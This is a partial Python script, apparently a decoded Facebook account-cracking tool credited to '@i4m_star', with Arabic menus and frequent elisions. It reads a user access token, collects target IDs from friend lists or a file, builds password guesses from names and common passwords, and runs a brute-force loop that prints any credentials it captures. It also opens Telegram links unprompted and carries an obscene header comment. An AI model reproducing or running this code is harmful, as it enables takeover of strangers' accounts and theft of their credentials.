...
#fuck your mother demo
#raven♥️
#sorry raven but star better than you♥️!
...
output = render('\x1b[RAVEN', colors=['red', 'blue'], align='center')
print(output)
print('\033[1;33mاهلا بك في ادات صيد فيسبوك عن طريق الايدي 😍')
print('\033[38;5;66m@DECODE BY @i4m_star ')
tokenn = input(X +'  𝑻𝑶𝑲𝑬𝑵 : ' + F)
import webbrowser
print('')
ID = input('\033[38;5;62m𝑰𝑫 : ' + F)
os.system('clear')
cetak(nel('\tالمدفوعة 🤍🔥'))
...
\nDECODR BY I4m_star""")
    ...
    print('')
    print(G+'  من الاصدقاء→1')
    
    print(H+'file [من ملف] : 2')
    print('')
...
def crack_file():
			try:
				fileX = input ('\033[1;31m[\033[1;32m?\033[1;31m]\033[1;38m FILE : ')
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				print(f'\033[1;31m[\033[1;32m•\033[1;31m]\033[1;32mID : \x1b[1;92m'+str(len(id)))
				setting()
			except IOError:
				print("\033[1;31m[\033[1;31m!\033[1;31m]\033[1;31mFILE %s NOT FOUND\x1b[0m"%(fileX))
			except:print('55555erroe')
def dump_massal():
#----------------🌪🔥---------------#
    try:
        token = open('.dd.txt','r').read()
    ...
    try:
        print('')
        print(B+'الاداه المدفوعه i4m_star ')
...
def setting():
    webbrowser.open('https://t.me/zZkgZ')
    print(f'\033[38;5;9m» 1- 𝐈𝐃 𝐎𝐋𝐃 | الاولويه في الفحص للحسابات القديمه')
    print('\033[38;5;11m» 2- 𝐈𝐃 𝐍𝐄𝐖 | الاولويه في الفحص للحسابات الجديده')
    print('\033[38;5;27m» 3- 𝐎𝐋𝐃+𝐍𝐄𝐖 | قـديـمـه وجـديده ')
    print(B+'  ━━━━━━━━━━━━━━━━━━  ')
    hu = input('\033[38;5;32m اختار ➪ : ')
    if hu in ['1','01']:
...
#        method.append('touch')
        ...
        method.append('mobile')
    print('')
    _jembot_ = input('\033[38;5;77m 𝐀𝐃𝐃 𝐀𝐏𝐏 : اظهار التطبيقات المرتبطه ( 𓆩Y𓆪/𓆩T𓆪 )')
    if _jembot_ in ['']:
        ...
        taplikasi.append('no')
    pwplus=input('\033[38;5;53m 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐌𝐀𝐍𝐔𝐀𝐋 ➪ باسورد يدوي (𓆩T𓆪 عشوائي)( 𓆩Y𓆪/𓆩T𓆪 ) ')
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
...
def passwrd():
        ...
        for yuzong in id2:
            ...
            if len(nmf)<6:
                if len(frs)<3:
                    ...
                    pwv.append('20002000')
                    pwv.append('hamza236')
                    pwv.append('Rafael007')
                    pwv.append('toni199')
                    pwv.append('faris518')
                    pwv.append('younes212')
                    pwv.append('ibrahim909')
                    pwv.append('hamza236')
                    pwv.append('ali080')
                    pwv.append('19901990')
                    pwv.append('19801980')
    ...
    if woi in ['y','Y']:
        ...
        exit()
def crack(idf,pwv):
    #webbrowser.open('https://t.me/zzKz')
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    print('\r%s [STAR 🐳] %s/%s  |  [๏к] %s | [ςρ] %s | %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
✏️ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
♕━━━━━⚚i4m_star⚚━━━━━━━♕
[ لاتضوج هسه يجيك حساب فول ]
py - @i4m_star
                    '''
                    statuscp1 = nel(statuscp, style='yellow')
                    cetak(nel(statuscp1, title='ان شاء الله يجيك حساب حلو'))
